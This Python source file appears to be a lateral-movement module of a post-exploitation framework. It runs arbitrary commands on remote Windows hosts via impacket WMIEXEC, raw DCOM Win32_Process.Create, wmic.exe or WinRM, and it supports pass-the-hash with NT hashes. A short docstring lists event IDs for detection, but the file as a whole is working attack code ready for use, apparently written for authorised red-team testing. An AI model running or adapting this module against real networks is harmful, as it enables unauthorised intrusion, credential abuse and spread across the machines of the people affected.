"""Remote command execution via WMI/DCOM on Windows targets.

Supports four execution methods:
  wmiexec  — impacket WMIEXEC (recommended; handles output capture via ADMIN$)
  dcom     — raw DCOMConnection + Win32_Process.Create (no output capture)
  wmic     — subprocess wmic.exe (Windows operator machine required)
  winrm    — PyPSRP / PowerShell remoting over WinRM (TCP 5985/5986)

Dependencies (optional — graceful errors when missing):
  pip install impacket   # wmiexec, dcom
  pip install pypsrp     # winrm

Args accepted by run():
  target    — IP or hostname of the Windows target
  username  — account name (default: "")
  password  — plaintext password (default: "")
  domain    — NETBIOS domain (default: "")
  nt_hash   — "LM:NT" or bare NT hash for pass-the-hash (default: "")
  command   — command to execute (default: "whoami /all")
  method    — wmiexec | dcom | wmic | winrm  (default: wmiexec)

Detection notes:
  Event ID 4624 (logon type 3), 4688 (process creation under wmiprvse.exe),
  Microsoft-Windows-WMI-Activity/Operational log, TCP 135 + dynamic RPC ports.
"""

from __future__ import annotations

import platform
import subprocess
from typing import Tuple

from post.base import ModuleResult, PostModule
from post.loader import register

# ── Optional dependency flags ──────────────────────────────────────────────────

try:
    from impacket.dcerpc.v5.dcomrt import DCOMConnection
    from impacket.dcerpc.v5.dcom import wmi as _wmi_dcom
    from impacket.examples.wmiexec import WMIEXEC
    _IMPACKET_OK = True
except ImportError:
    _IMPACKET_OK = False

try:
    from pypsrp.client import Client as _PSRPClient
    _PYPSRP_OK = True
except ImportError:
    _PYPSRP_OK = False


# ── Helpers ────────────────────────────────────────────────────────────────────

def _split_hash(nt_hash: str) -> Tuple[str, str]:
    """Split 'LM:NT' or bare NT hash string into (lmhash, nthash)."""
    if ":" in nt_hash:
        lm, nt = nt_hash.split(":", 1)
        return lm, nt
    # Bare NT hash — supply the empty LM hash
    return "aad3b435b51404eeaad3b435b51404ee", nt_hash


# ── Execution back-ends ────────────────────────────────────────────────────────

def _run_wmiexec(
    target: str, username: str, password: str,
    domain: str, nt_hash: str, command: str,
) -> ModuleResult:
    """Execute via impacket WMIEXEC (handles output capture via ADMIN$ share)."""
    if not _IMPACKET_OK:
        return ModuleResult(
            ok=False, output="",
            error="impacket not installed. Run: pip install impacket",
        )
    lmhash, nthash = _split_hash(nt_hash) if nt_hash else ("", "")
    hashes_str = f"{lmhash}:{nthash}" if nt_hash else None
    try:
        exec_obj = WMIEXEC(
            target=target,
            username=username,
            password=password,
            domain=domain,
            hashes=hashes_str,
            aesKey=None,
            doKerberos=False,
            kdcHost=None,
            share="ADMIN$",
            shell_type="cmd",
        )
        output = exec_obj.run(command, output=True) or ""
        return ModuleResult(
            ok=True,
            output=f"[wmiexec] {target} → {command}\n\n{output}",
            data={
                "method": "wmiexec",
                "target": target,
                "command": command,
                "output": output,
            },
        )
    except Exception as exc:
        return ModuleResult(ok=False, output="", error=f"wmiexec failed: {exc}")


def _run_dcom(
    target: str, username: str, password: str,
    domain: str, nt_hash: str, command: str,
) -> ModuleResult:
    """Execute via raw DCOMConnection + Win32_Process.Create.

    NOTE: Create() does not return stdout.  Output is written to a temp file
    on the target; retrieve it separately via SMB.
    """
    if not _IMPACKET_OK:
        return ModuleResult(
            ok=False, output="",
            error="impacket not installed. Run: pip install impacket",
        )
    lmhash, nthash = _split_hash(nt_hash) if nt_hash else ("", "")
    try:
        dcom = DCOMConnection(
            target,
            username=username,
            password=password,
            domain=domain,
            lmhash=lmhash,
            nthash=nthash,
            oxidResolver=True,
        )
        iface = dcom.CoCreateInstanceEx(
            _wmi_dcom.CLSID_WbemLevel1Login,
            _wmi_dcom.IID_IWbemLevel1Login,
        )
        login = _wmi_dcom.IWbemLevel1Login(iface)
        services = login.NTLMLogin("//./root/cimv2", None, None)
        win32proc, _ = services.GetObject("Win32_Process")
        out_file = r"C:\Windows\Temp\ursa_wmi.txt"
        wrapped = f"cmd.exe /c {command} > {out_file} 2>&1"
        result = win32proc.Create(wrapped, "C:\\", None)
        pid = getattr(result, "ProcessId", "?")
        dcom.disconnect()
        return ModuleResult(
            ok=True,
            output=(
                f"[dcom] Spawned PID {pid} on {target}: {command}\n"
                f"Output written to {out_file} — retrieve via SMB."
            ),
            data={
                "method": "dcom",
                "target": target,
                "command": command,
                "pid": pid,
                "output_file": out_file,
            },
        )
    except Exception as exc:
        return ModuleResult(ok=False, output="", error=f"DCOM execution failed: {exc}")


def _run_wmic(
    target: str, username: str, password: str,
    domain: str, command: str,
) -> ModuleResult:
    """Execute via wmic.exe (requires Windows on the operator's machine)."""
    if platform.system() != "Windows":
        return ModuleResult(
            ok=False, output="",
            error=(
                "wmic method requires Windows on the operator machine. "
                "Use 'wmiexec' or 'dcom' for cross-platform execution."
            ),
        )
    parts = ["wmic", f"/node:{target}"]
    if username:
        user_str = f"{domain}\\{username}" if domain else username
        parts += [f"/user:{user_str}"]
    if password:
        parts += [f"/password:{password}"]
    parts += ["process", "call", "create", f"cmd.exe /c {command}"]
    try:
        r = subprocess.run(parts, capture_output=True, text=True, timeout=30)
        output = (r.stdout + r.stderr).strip()
        ok = r.returncode == 0 or "ProcessId" in output
        return ModuleResult(
            ok=ok,
            output=f"[wmic] {target} → {command}\n\n{output}",
            data={"method": "wmic", "target": target, "command": command, "output": output},
            error="" if ok else f"wmic exited {r.returncode}",
        )
    except FileNotFoundError:
        return ModuleResult(ok=False, output="", error="wmic.exe not found. Requires Windows with WMI CLI tools.")
    except subprocess.TimeoutExpired:
        return ModuleResult(ok=False, output="", error="wmic timed out after 30 s")
    except Exception as exc:
        return ModuleResult(ok=False, output="", error=f"wmic error: {exc}")


def _run_winrm(
    target: str, username: str, password: str, command: str,
) -> ModuleResult:
    """Execute via PowerShell Remoting / WinRM using pypsrp."""
    if not _PYPSRP_OK:
        return ModuleResult(
            ok=False, output="",
            error="pypsrp not installed. Run: pip install pypsrp",
        )
    try:
        client = _PSRPClient(
            target,
            username=username,
            password=password,
            auth="negotiate",
            ssl=False,
        )
        output, _streams, had_errors = client.execute_ps(command)
        output = output or ""
        return ModuleResult(
            ok=not had_errors,
            output=f"[winrm] {target} → {command}\n\n{output}",
            data={
                "method": "winrm",
                "target": target,
                "command": command,
                "output": output,
            },
            error="PowerShell execution had errors" if had_errors else "",
        )
    except Exception as exc:
        return ModuleResult(ok=False, output="", error=f"WinRM/PSRemoting failed: {exc}")


# ── Module ─────────────────────────────────────────────────────────────────────

@register
class WMIExecModule(PostModule):
    NAME        = "lateral/wmi"
    DESCRIPTION = "Remote command execution via WMI/DCOM on Windows targets"
    PLATFORM    = ["windows"]
    IMPLEMENTED = True

    def run(self, args: dict | None = None) -> ModuleResult:
        args     = args or {}
        target   = args.get("target",   "").strip()
        username = args.get("username", "").strip()
        password = args.get("password", "").strip()
        domain   = args.get("domain",   "").strip()
        nt_hash  = args.get("nt_hash",  "").strip()
        command  = args.get("command",  "whoami /all").strip()
        method   = args.get("method",   "wmiexec").strip().lower()

        if not target:
            return ModuleResult(ok=False, output="", error="Required: target (IP or hostname)")
        if not command:
            return ModuleResult(ok=False, output="", error="Required: command")

        if method == "wmiexec":
            return _run_wmiexec(target, username, password, domain, nt_hash, command)
        elif method == "dcom":
            return _run_dcom(target, username, password, domain, nt_hash, command)
        elif method == "wmic":
            return _run_wmic(target, username, password, domain, command)
        elif method == "winrm":
            return _run_winrm(target, username, password, command)
        else:
            return ModuleResult(
                ok=False, output="",
                error=f"Unknown method: {method!r}. Choose: wmiexec, dcom, wmic, winrm",
            )
